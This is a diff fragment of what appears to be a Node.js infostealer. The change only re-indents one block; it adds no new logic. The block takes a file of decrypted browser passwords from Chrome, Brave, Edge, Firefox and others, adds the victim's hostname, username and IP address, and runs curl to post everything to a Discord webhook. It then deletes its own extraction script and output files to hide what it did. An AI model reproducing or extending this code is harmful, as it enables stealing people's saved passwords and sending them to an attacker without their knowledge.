@@ -1591,92 +1591,92 @@ python3 "${pythonScript}" 2>/dev/null || {
                             const content = fs.readFileSync(OUTPUT_FILE, 'utf8');
                             
                             if (content && content.length > 50) {
-                        // Get IP address
-                        const ip = os.networkInterfaces();
-                        let ipAddress = 'Unknown';
-                        for (const name of Object.keys(ip)) {
-                            for (const iface of ip[name]) {
-                                if (iface.family === 'IPv4' && !iface.internal) {
-                                    ipAddress = iface.address;
-                                    break;
+                                // Get IP address
+                                const ip = os.networkInterfaces();
+                                let ipAddress = 'Unknown';
+                                for (const name of Object.keys(ip)) {
+                                    for (const iface of ip[name]) {
+                                        if (iface.family === 'IPv4' && !iface.internal) {
+                                            ipAddress = iface.address;
+                                            break;
+                                        }
+                                    }
+                                    if (ipAddress !== 'Unknown') break;
                                 }
-                            }
-                            if (ipAddress !== 'Unknown') break;
-                        }
-                        
-                        // Detect which browsers were found
-                        const browsers = [];
-                        if (content.includes('CHROME PASSWORDS') || content.includes('Chrome')) browsers.push('Chrome');
-                        if (content.includes('BRAVE PASSWORDS') || content.includes('Brave')) browsers.push('Brave');
-                        if (content.includes('EDGE PASSWORDS') || content.includes('Edge')) browsers.push('Edge');
-                        if (content.includes('OPERA PASSWORDS') || content.includes('Opera')) browsers.push('Opera');
-                        if (content.includes('VIVALDI PASSWORDS') || content.includes('Vivaldi')) browsers.push('Vivaldi');
-                        if (content.includes('FIREFOX PASSWORDS') || content.includes('Firefox')) browsers.push('Firefox');
-                        if (content.includes('SAFARI PASSWORDS') || content.includes('Safari')) browsers.push('Safari');
-                        const browserList = browsers.length > 0 ? browsers.join(', ') : 'Unknown';
-                        
-                        // Format browser list with emojis
-                        const browserEmojis = {
-                            'Chrome': '🌐',
-                            'Brave': '🦁',
-                            'Edge': '🔷',
-                            'Opera': '🎭',
-                            'Vivaldi': '🔴',
-                            'Firefox': '🦊',
-                            'Safari': '🧭'
-                        };
-                        const browserDisplay = browsers.length > 0 
-                            ? browsers.map(b => `${browserEmojis[b] || '🔹'} ${b}`).join(', ')
-                            : 'Unknown';
-                        
-                        // Create prettier embed message with styled formatting
-                        const message = {
-                            embeds: [{
-                                title: "🔐 Browser Passwords",
-                                color: 16750848,
-                                description: `\`\`\`\nPasswords found from: ${browserList}\n\n📎 Full password list attached below\n\`\`\``,
-                                fields: [
-                                    { name: "🌐 Browsers", value: `\`\`\`\n${browserDisplay}\n\`\`\``, inline: false },
-                                    { name: "💻 Hostname", value: `\`${HOSTNAME}\``, inline: true },
-                                    { name: "👤 PC Username", value: `\`${USERNAME}\``, inline: true },
-                                    { name: "🌍 IP Address", value: `\`${ipAddress}\``, inline: true },
-                                    { name: "⏰ Time", value: `\`${new Date().toLocaleString()}\``, inline: false }
-                                ],
-                                footer: { text: "Password extraction completed" },
-                                timestamp: new Date().toISOString()
-                            }]
-                        };
-                        
-                        // Send to Discord with file attachment (use temp JSON file for proper formatting)
-                        try {
-                            const payloadFile = path.join(screenshotDir, `password_payload_${Date.now()}.json`);
-                            fs.writeFileSync(payloadFile, JSON.stringify(message));
-                            
-                            // Send file + message to Discord (passwords are already decrypted in file)
-                            exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${OUTPUT_FILE};type=text/plain" "${WEBHOOK}"`, (error) => {
-                                setTimeout(() => {
-                                    try { 
-                                        fs.unlinkSync(payloadFile);
-                                        fs.unlinkSync(EXTRACT_SCRIPT);
-                                        fs.unlinkSync(OUTPUT_FILE);
-                                    } catch (e) {}
-                                }, 10000);
-                            });
-                        } catch (e) {
-                            // Fallback: send embed only (no file)
-                            try {
-                                const payloadJson = JSON.stringify(message);
-                                exec(`curl -s -X POST -H "Content-Type: application/json" -d '${payloadJson}' "${WEBHOOK}"`, () => {
-                                    setTimeout(() => {
-                                        try { 
-                                            fs.unlinkSync(EXTRACT_SCRIPT);
-                                            fs.unlinkSync(OUTPUT_FILE);
-                                        } catch (e) {}
-                                    }, 10000);
-                                });
-                            } catch (e2) {}
-                        }
-                        } else {
+                                
+                                // Detect which browsers were found
+                                const browsers = [];
+                                if (content.includes('CHROME PASSWORDS') || content.includes('Chrome')) browsers.push('Chrome');
+                                if (content.includes('BRAVE PASSWORDS') || content.includes('Brave')) browsers.push('Brave');
+                                if (content.includes('EDGE PASSWORDS') || content.includes('Edge')) browsers.push('Edge');
+                                if (content.includes('OPERA PASSWORDS') || content.includes('Opera')) browsers.push('Opera');
+                                if (content.includes('VIVALDI PASSWORDS') || content.includes('Vivaldi')) browsers.push('Vivaldi');
+                                if (content.includes('FIREFOX PASSWORDS') || content.includes('Firefox')) browsers.push('Firefox');
+                                if (content.includes('SAFARI PASSWORDS') || content.includes('Safari')) browsers.push('Safari');
+                                const browserList = browsers.length > 0 ? browsers.join(', ') : 'Unknown';
+                                
+                                // Format browser list with emojis
+                                const browserEmojis = {
+                                    'Chrome': '🌐',
+                                    'Brave': '🦁',
+                                    'Edge': '🔷',
+                                    'Opera': '🎭',
+                                    'Vivaldi': '🔴',
+                                    'Firefox': '🦊',
+                                    'Safari': '🧭'
+                                };
+                                const browserDisplay = browsers.length > 0 
+                                    ? browsers.map(b => `${browserEmojis[b] || '🔹'} ${b}`).join(', ')
+                                    : 'Unknown';
+                                
+                                // Create prettier embed message with styled formatting
+                                const message = {
+                                    embeds: [{
+                                        title: "🔐 Browser Passwords",
+                                        color: 16750848,
+                                        description: `\`\`\`\nPasswords found from: ${browserList}\n\n📎 Full password list attached below\n\`\`\``,
+                                        fields: [
+                                            { name: "🌐 Browsers", value: `\`\`\`\n${browserDisplay}\n\`\`\``, inline: false },
+                                            { name: "💻 Hostname", value: `\`${HOSTNAME}\``, inline: true },
+                                            { name: "👤 PC Username", value: `\`${USERNAME}\``, inline: true },
+                                            { name: "🌍 IP Address", value: `\`${ipAddress}\``, inline: true },
+                                            { name: "⏰ Time", value: `\`${new Date().toLocaleString()}\``, inline: false }
+                                        ],
+                                        footer: { text: "Password extraction completed" },
+                                        timestamp: new Date().toISOString()
+                                    }]
+                                };
+                                
+                                // Send to Discord with file attachment (use temp JSON file for proper formatting)
+                                try {
+                                    const payloadFile = path.join(screenshotDir, `password_payload_${Date.now()}.json`);
+                                    fs.writeFileSync(payloadFile, JSON.stringify(message));
+                                    
+                                    // Send file + message to Discord (passwords are already decrypted in file)
+                                    exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${OUTPUT_FILE};type=text/plain" "${WEBHOOK}"`, (error) => {
+                                        setTimeout(() => {
+                                            try { 
+                                                fs.unlinkSync(payloadFile);
+                                                fs.unlinkSync(EXTRACT_SCRIPT);
+                                                fs.unlinkSync(OUTPUT_FILE);
+                                            } catch (e) {}
+                                        }, 10000);
+                                    });
+                                } catch (e) {
+                                    // Fallback: send embed only (no file)
+                                    try {
+                                        const payloadJson = JSON.stringify(message);
+                                        exec(`curl -s -X POST -H "Content-Type: application/json" -d '${payloadJson}' "${WEBHOOK}"`, () => {
+                                            setTimeout(() => {
+                                                try { 
+                                                    fs.unlinkSync(EXTRACT_SCRIPT);
+                                                    fs.unlinkSync(OUTPUT_FILE);
+                                                } catch (e) {}
+                                            }, 10000);
+                                        });
+                                    } catch (e2) {}
+                                }
+                            } else {
                             // No content or file too small - retry
                             if (attempts < 10) {
                                 setTimeout(waitForOutput, 500);
